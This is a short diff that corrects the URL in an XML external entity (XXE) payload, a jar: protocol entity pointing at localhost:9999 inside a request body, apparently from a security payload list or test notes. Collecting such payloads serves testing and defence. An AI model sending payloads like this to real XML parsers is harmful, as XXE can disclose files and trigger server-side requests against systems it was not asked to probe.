@@ -13,6 +13,6 @@ Content-Type: application/xml
 
 <?xml version="1.0"?>
 <!DOCTYPE convert [ 
-  <!ENTITY remote SYSTEM "jar:http:/localhost:9999/jarzip!/test.php'> 
+  <!ENTITY remote SYSTEM "jar:http://localhost:9999/jarzip!/test.php'>
 ]>
 <convert>&remote;</convert>
